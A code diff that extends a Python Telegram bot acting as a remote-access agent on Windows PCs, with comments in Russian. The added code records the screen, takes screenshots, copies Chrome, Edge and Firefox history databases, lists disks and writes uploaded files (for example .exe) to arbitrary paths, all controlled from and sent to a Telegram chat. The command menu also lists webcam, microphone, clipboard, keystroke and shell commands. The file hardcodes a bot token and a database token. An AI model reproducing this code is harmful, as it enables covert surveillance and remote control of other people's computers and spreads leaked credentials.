@@ -65,7 +65,7 @@ pyautogui.FAILSAFE = False
 # ==============================
 BOT_TOKEN   = "8369819060:AAEC_GjpRz265vAnw83AYfCh4VWURh0ns8U"
 CHAT_ID     = 1861646465
-PC_NAME     = "Мой ПК"   # ← ИЗМЕНИ НА КАЖДОМ ПК
+PC_NAME     = socket.gethostname()  # Берётся автоматически из имени ПК
 
 REDIS_URL   = "https://equipped-goshawk-68311.upstash.io"
 REDIS_TOKEN = "gQAAAAAAAQrXAAIncDJmOWVmZWQ2N2I4MWE0MjQ5Yjk0MGEzM2FhZDZhNzM3M3AyNjgzMTE"
@@ -383,6 +383,133 @@ def execute_command(cmd, args=""):
                 os._exit(0)
             except Exception as e:
                 bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: ошибка обновления: {e}", parse_mode='HTML')
+
+
+        elif cmd == "record":
+            seconds = min(int(args) if args.isdigit() else 10, 60)
+            bot.send_message(CHAT_ID, f"🎥 <b>{PC_NAME}</b>: записываю экран {seconds} сек...", parse_mode='HTML')
+            try:
+                import numpy as np
+                frames = []
+                start = time.time()
+                while time.time() - start < seconds:
+                    img = ImageGrab.grab()
+                    frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))
+                    time.sleep(0.1)
+                if not frames:
+                    bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: нет кадров", parse_mode='HTML'); return
+                h, w = frames[0].shape[:2]
+                tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "screen_record.avi")
+                out = cv2.VideoWriter(tmp, cv2.VideoWriter_fourcc(*'XVID'), 10, (w, h))
+                for f in frames:
+                    out.write(f)
+                out.release()
+                with open(tmp, 'rb') as f:
+                    bot.send_video(CHAT_ID, f, caption=f"🎥 Запись экрана {seconds} сек — {PC_NAME}")
+                os.remove(tmp)
+            except Exception as e:
+                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: ошибка записи: {e}", parse_mode='HTML')
+
+        elif cmd == "disks":
+            text = f"💿 <b>{PC_NAME}</b> — диски:\n\n"
+            for part in psutil.disk_partitions():
+                try:
+                    usage = psutil.disk_usage(part.mountpoint)
+                    text += (f"<b>{part.device}</b> ({part.fstype})\n"
+                             f"  Всего: {usage.total//1024**3} GB\n"
+                             f"  Занято: {usage.used//1024**3} GB ({usage.percent}%)\n"
+                             f"  Свободно: {usage.free//1024**3} GB\n\n")
+                except Exception:
+                    text += f"<b>{part.device}</b> — нет доступа\n\n"
+            bot.send_message(CHAT_ID, text, parse_mode='HTML')
+
+        elif cmd == "upload":
+            # args = "путь|base64данные"
+            import base64
+            sep = args.index("|")
+            save_path = args[:sep]
+            data = base64.b64decode(args[sep+1:])
+            os.makedirs(os.path.dirname(save_path), exist_ok=True)
+            with open(save_path, 'wb') as f:
+                f.write(data)
+            bot.send_message(CHAT_ID, f"✅ <b>{PC_NAME}</b>: файл сохранён → <code>{save_path}</code>", parse_mode='HTML')
+
+
+        elif cmd == "ss_game":
+            # Скриншот через Windows Graphics Capture (работает с играми/DirectX)
+            try:
+                import ctypes
+                # Используем PrintWindow через win32 API
+                result = subprocess.run([
+                    "powershell", "-c",
+                    "Add-Type -AssemblyName System.Windows.Forms; "
+                    "$bmp = [System.Windows.Forms.Screen]::PrimaryScreen; "
+                    "$b = New-Object System.Drawing.Bitmap($bmp.Bounds.Width, $bmp.Bounds.Height); "
+                    "$g = [System.Drawing.Graphics]::FromImage($b); "
+                    "$g.CopyFromScreen($bmp.Bounds.Location, [System.Drawing.Point]::Empty, $bmp.Bounds.Size); "
+                    "$b.Save('$env:TEMP\\ss_game.png'); "
+                    "$g.Dispose(); $b.Dispose()"
+                ], capture_output=True, timeout=10)
+                tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "ss_game.png")
+                if os.path.exists(tmp):
+                    with open(tmp, 'rb') as f:
+                        bot.send_photo(CHAT_ID, f, caption=f"🎮 <b>{PC_NAME}</b> — скриншот (игровой режим)", parse_mode='HTML')
+                    os.remove(tmp)
+                else:
+                    # Fallback через PIL с all_screens
+                    buf = io.BytesIO()
+                    ImageGrab.grab(all_screens=True).save(buf, format='PNG')
+                    buf.seek(0)
+                    bot.send_photo(CHAT_ID, buf, caption=f"🎮 <b>{PC_NAME}</b>", parse_mode='HTML')
+            except Exception as e:
+                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: {e}", parse_mode='HTML')
+
+        elif cmd == "history":
+            import sqlite3, shutil
+            limit = int(args) if args and args.isdigit() else 15
+            limit = min(limit, 100)
+            results = []
+            browsers = {
+                "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History"),
+                "Edge":   os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"),
+                "Firefox": None
+            }
+            ff_base = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
+            if os.path.exists(ff_base):
+                for profile in os.listdir(ff_base):
+                    ff_db = os.path.join(ff_base, profile, "places.sqlite")
+                    if os.path.exists(ff_db):
+                        browsers["Firefox"] = ff_db
+                        break
+            for browser, db_path in browsers.items():
+                if not db_path or not os.path.exists(db_path):
+                    continue
+                try:
+                    tmp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"hist_{browser}.db")
+                    shutil.copy2(db_path, tmp_db)
+                    conn = sqlite3.connect(tmp_db)
+                    cur = conn.cursor()
+                    if browser == "Firefox":
+                        cur.execute(f"SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT {limit}")
+                    else:
+                        cur.execute(f"SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
+                    rows = cur.fetchall()
+                    conn.close()
+                    os.remove(tmp_db)
+                    if rows:
+                        results.append(f"\n<b>🌐 {browser}:</b>")
+                        for i, (url, title, cnt) in enumerate(rows, 1):
+                            t = (title or url)[:50]
+                            results.append(f"  {i}. {t}")
+                except Exception as e:
+                    results.append(f"<b>{browser}:</b> ❌ {e}")
+            if results:
+                text = f"📝 <b>{PC_NAME}</b> — история (топ {limit}):" + "\n".join(results)
+                if len(text) > 4000:
+                    text = text[:4000] + "\n...(обрезано)"
+                bot.send_message(CHAT_ID, text, parse_mode='HTML')
+            else:
+                bot.send_message(CHAT_ID, f"📝 <b>{PC_NAME}</b>: история не найдена", parse_mode='HTML')
 
         elif cmd == "cmd":
             result = subprocess.run(args, shell=True, capture_output=True,
@@ -792,6 +919,72 @@ def cmd_video(message):
     parts = message.text.split()
     route(message, "video", parts[1] if len(parts) > 1 else "5")
 
+
+@bot.message_handler(commands=['record'])
+def cmd_record(message):
+    if not is_authorized(message): return
+    parts = message.text.split()
+    route(message, "record", parts[1] if len(parts) > 1 else "10")
+
+@bot.message_handler(commands=['disks'])
+def cmd_disks(message):
+    if not is_authorized(message): return
+    route(message, "disks")
+
+@bot.message_handler(content_types=['document'])
+def handle_upload(message):
+    if not is_authorized(message): return
+    target = get_selected(message.chat.id)
+    # Спросить куда сохранить
+    file_name = message.document.file_name
+    markup = InlineKeyboardMarkup(row_width=1)
+    default_path = f"C:\\Users\\LERA\\Downloads\\{file_name}"
+    markup.add(
+        InlineKeyboardButton(f"💾 Downloads\\{file_name}", callback_data=f"savefile_{default_path}"),
+        InlineKeyboardButton("📁 Указать путь вручную", callback_data=f"savefile_custom_{file_name}")
+    )
+    bot.reply_to(message, 
+        f"📤 Куда сохранить <b>{file_name}</b> на <b>{target}</b>?",
+        parse_mode='HTML', reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("savefile_"))
+def callback_savefile(call):
+    if not auth_cb(call): return
+    import base64
+    data = call.data[9:]
+    if data.startswith("custom_"):
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "Напиши полный путь куда сохранить файл, например:\n<code>C:\\Users\\LERA\\Desktop\\файл.exe</code>", parse_mode='HTML')
+        return
+    save_path = data
+    # Найти файл из предыдущего сообщения
+    try:
+        doc = call.message.reply_to_message.document
+        file_info = bot.get_file(doc.file_id)
+        downloaded = bot.download_file(file_info.file_path)
+        encoded = base64.b64encode(downloaded).decode()
+        target = get_selected(call.message.chat.id)
+        bot.answer_callback_query(call.id, "📤 Отправляю на ПК...")
+        if target == PC_NAME:
+            threading.Thread(target=execute_command, args=("upload", f"{save_path}|{encoded}"), daemon=True).start()
+        else:
+            send_command_to_pc(target, "upload", f"{save_path}|{encoded}")
+            bot.send_message(call.message.chat.id, f"📤 Файл отправлен на <b>{target}</b>...", parse_mode='HTML')
+    except Exception as e:
+        bot.send_message(call.message.chat.id, f"❌ Ошибка: {e}")
+
+
+@bot.message_handler(commands=['ss_game', 'ssg'])
+def cmd_ss_game(message):
+    if not is_authorized(message): return
+    route(message, "ss_game")
+
+@bot.message_handler(commands=['history'])
+def cmd_history(message):
+    if not is_authorized(message): return
+    parts = message.text.split(maxsplit=1)
+    route(message, "history", parts[1] if len(parts) > 1 else "15")
+
 @bot.message_handler(commands=['update'])
 def cmd_update(message):
     if not is_authorized(message): return
@@ -814,5 +1007,42 @@ def cmd_cmd(message):
     route(message, "cmd", parts[1])
 
 # ─── Запуск ───────────────────────────────────────────────
+
+# Устанавливаем меню команд в Telegram
+try:
+    from telebot.types import BotCommand, BotCommandScopeDefault
+    bot.set_my_commands([
+        BotCommand("start",    "📋 Список всех команд"),
+        BotCommand("pcs",      "🖥 Выбрать ПК"),
+        BotCommand("ss",       "📸 Скриншот"),
+        BotCommand("ssg",      "🎮 Скриншот (игры/DirectX)"),
+        BotCommand("sysinfo",  "📊 Инфо о системе"),
+        BotCommand("tasks",    "⚙️ Процессы"),
+        BotCommand("files",    "📂 Файловый менеджер"),
+        BotCommand("disks",    "💿 Диски"),
+        BotCommand("history",  "📝 История браузера"),
+        BotCommand("record",   "🎥 Запись экрана"),
+        BotCommand("cam",      "📷 Фото с камеры"),
+        BotCommand("video",    "🎬 Видео с камеры"),
+        BotCommand("mic",      "🎤 Запись микрофона"),
+        BotCommand("vol",      "🔊 Громкость"),
+        BotCommand("mute",     "🔇 Выключить звук"),
+        BotCommand("unmute",   "🔈 Включить звук"),
+        BotCommand("search",   "🔍 Поиск в Google"),
+        BotCommand("open",     "🌐 Открыть сайт/программу"),
+        BotCommand("type",     "⌨️ Напечатать текст"),
+        BotCommand("key",      "⌨️ Нажать клавишу"),
+        BotCommand("click",    "🖱 Клик мышью"),
+        BotCommand("mouse",    "🖱 Переместить мышь"),
+        BotCommand("clip",     "📋 Буфер обмена"),
+        BotCommand("notify",   "🔔 Уведомление на ПК"),
+        BotCommand("cmd",      "💻 CMD команда"),
+        BotCommand("shutdown", "⛔ Выключить ПК"),
+        BotCommand("reboot",   "🔄 Перезагрузить"),
+        BotCommand("sleep",    "💤 Спящий режим"),
+        BotCommand("update",   "⬆️ Обновить бота"),
+    ])
+except Exception:
+    pass
 
 bot.polling(none_stop=True, interval=1)
